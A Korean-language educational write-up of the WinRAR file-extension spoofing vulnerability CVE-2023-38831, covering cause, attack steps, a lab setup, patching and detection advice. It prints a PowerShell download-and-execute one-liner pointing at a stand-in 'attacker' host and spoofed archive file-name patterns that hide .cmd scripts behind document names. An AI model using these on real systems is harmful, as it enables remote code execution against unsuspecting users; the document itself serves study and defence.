# 취약점 개요

## 📋 설명

Zip 파일 내부에 특수하게 조작된 파일 구조를 삽입할 경우, WinRAR은 내부 파일의 실제 확장자와 UI에 표시되는 확장자를 다르게 인식합니다.

사용자는 문서 파일을 연다고 생각하지만, WinRAR은 악성 스크립트 또는 실행 파일을 자동 실행합니다.

이는 전 세계 약 5억 명의 사용자가 사용하는 WinRAR의 구조적 문제로, 실제 공격이 광범위하게 전개된 중요한 취약점입니다.

## ⚠️ 왜 위험한가?

**낮은 공격 난이도**: 사용자 클릭 단 한 번으로 시스템 장악

**광범위한 영향**: 전 세계 WinRAR 사용자 약 5억 명이 잠재적 위험에 노출

**실제 공격 사례**: CERT-UA가 이 취약점을 활용한 대규모 공격을 보고, Cobalt Strike beacon 유포 사례도 발견됨

**이메일 기반 유포 용이**: 이메일 첨부 파일, 파일 공유 서비스 등에서 악성 ZIP 유포 매우 쉬움

---

## 취약점 정보

| 항목           | 내용                                                      |
| -------------- | --------------------------------------------------------- |
| CVSS 점수      | 7.8 (High)                                                |
| 취약점 유형    | Extension Spoofing → Arbitrary Code Execution (ACE)       |
| 영향 버전      | WinRAR 6.22 이하 모든 버전                                |
| 공격 난이도    | Low (사용자 클릭 1회 필요)                                 |
| 공개일         | 2023년 7월                                                |
| 영향 범위       | 전 세계 WinRAR 사용자 약 5억 명                            |

## 🧠 핵심 원인: 확장자 스푸핑(Extension Spoofing)과 경로 조작(Path Manipulation)

- WinRAR은 ZIP 내부 파일의 이름 및 경로 문자열을 UI 표시 문자열과 다르게 처리합니다.

- 공격자는 이를 악용해 사용자가 보기에 무해한 문서처럼 보이지만 사실은 실행 파일인 페이로드를 ZIP 내부에 삽입할 수 있습니다.


**사용자에게 보여지는 이름:**

```
document.pdf
```

**실제 내부 구조:**

```
document.pdf                                      (UI)
document.pdf\..\..\evil.cmd                       (실제 실행)
```

- 또는 실행 파일을 문서 아이콘으로 바꾼 형태:

```
report.pdf.exe → UI에서는 report.pdf 로 표시
```

**결과:** 사용자가 문서라고 믿고 클릭 → WinRAR이 악성 스크립트 자동 실행 → 공격자 RCE 성공

---

# 공격 시나리오

**Step 1. 악성 ZIP 파일 제작**

- 공격자가 ZIP 내부에 악성 CMD/JS/VBS 실행 스크립트를 숨김

- 파일명은 문서 확장자처럼 위장(.pdf/.jpg)

**Step 2. 유포**

- 메일/메신저/게시판 등으로 유포

**Step 3. 피해자 다운로드 및 실행**

- 피해자가 ZIP 다운로드

- 취약한 WinRAR로 ZIP 열기

- 문서처럼 보이는 파일 클릭

**Step 4. RCE 성공**

- 실제로는 스크립트/EXE 실행 → RCE

- 결과: 시스템 장악, 정보 탈취, 추가 악성코드 설치 등

## 📌 공격 구조 개요

- 공격자는 ZIP 내부에 악성 CMD/JS/VBS 실행 스크립트를 숨김
- 파일명은 문서 확장자처럼 위장(.pdf/.jpg)
- WinRAR이 UI 표시와 실제 실행 경로를 분리해 처리
- 사용자가 문서를 여는 순간, 공격자 코드 실행

---

# 실습 환경 구성

| 역할   | 구성                                    | IP            |
| ------ | --------------------------------------- | ------------- |
| 피해자 | Windows 10 Pro 22H2 + WinRAR 6.22 (취약) | 192.168.0.x   |
| 공격자 | Windows 10 Pro 22H2 또는 Kali Linux     | -             |

## 사전 준비사항

- 취약 WinRAR 버전 설치 (6.22 이하)
- ZIP 파일 구조 이해
- 기본적인 PowerShell/CMD 스크립트 지식

---

# 취약점 상세 분석

## WinRAR의 구조적 문제

- ZIP 파일의 경로를 파싱할 때 '디렉터리 경계'를 잘못 인식
- 특히 `\` 와 `..` 를 포함한 경로를 안전하게 정규화하지 못함
- 확장자 판단에 UI 문자열만 사용 → 실질적 실행 파일인지 확인하지 못함

## 공격자가 악용하는 두 가지 포인트

### 명시적 확장자 스푸핑

```
.pdf.exe → UI에서 .pdf 까지만 보이게 처리
```

### 경로 조작 기반 실행 우회

```
filename\..\..\script.cmd 패턴
```

WinRAR 내부 preview/extract 과정에서 자동 실행 가능

## 💣 취약점 동작 테스트

**Step 1: 취약 WinRAR 설치**

- 공식 취약 버전 다운로드 링크: https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-622.exe

**Step 2: 악성 ZIP 제작**

- ZIP 내부에 다음과 같은 구조 삽입:

```
invoice.pdf                         (UI 표시)
invoice.pdf\..\..\run_payload.cmd   (실제 실행)
```

또는 파일명 스푸핑 예시:

```
meeting.docx␣␣␣␣.cmd
```

**Step 3: 피해자 클릭**

사용자는 PDF라고 생각하고 클릭 →

실제는 공격자 커맨드 실행 → Reverse shell 또는 악성 DLL 로드

## 📂 공격 활용 예시

**문서 내부 실행 스크립트 예시:**

```powershell
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
```

---

# 패치 정보

## 안전한 버전

- **WinRAR 6.23 이상**

## 즉시 업데이트

취약 버전: 6.22 이하

안전 버전: 6.23 이상

## 사용자 교육

- 이메일 첨부 ZIP 열람 시 주의
- 확장자 숨김 설정 비활성화 권장
- 문서 클릭 시 실제 실행 여부 확인

## 보안 솔루션 기반 탐지

- Sandbox 내에서 ZIP 자동 분석
- 확장자 스푸핑 패턴 탐지
- CMD/JS/VBS·EXE 파일 자동 차단

## 기업 환경 기준 대응

- 취약 WinRAR 설치 탐지 정책(Audit)
- 중앙 관리 SW 배포로 최신 버전 강제
- ZIP 파일 검사 시 확장자 불일치 경고 정책 적용

---

# 학습 포인트 (CVE 학습자용 요약)

## 🔹 UI에서 보이는 확장자가 실제 확장자가 아니다

- Zip 내부 구조에 따라 얼마든지 위장 가능.

## 🔹 패치 적용 전까지는 단일 클릭이라도 위험

- 사용자 의존 보안은 절대 충분하지 않음.

## 🔹 "경로 조작(Path Traversal)" 패턴은 다양한 파일 처리 라이브러리에서 반복되는 문제

- WinRAR뿐 아니라 다른 압축 도구에서도 유사 취약점 발생 가능.

## 🔹 공격자는 간단한 스크립트 삽입만으로 RCE를 얻을 수 있다

- 그만큼 위험한 취약점.

---

# 참고 자료

- [CERT-UA 공식 경고](https://cert.gov.ua/)

- [WinRAR RARLAB 공식 사이트](https://www.win-rar.com/)

- [PayloadsAllTheThings Reverse Shell cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings)

- [NVD CVE-2023-38831 상세 페이지](https://nvd.nist.gov/vuln/detail/CVE-2023-38831)

- SK쉴더스 보고서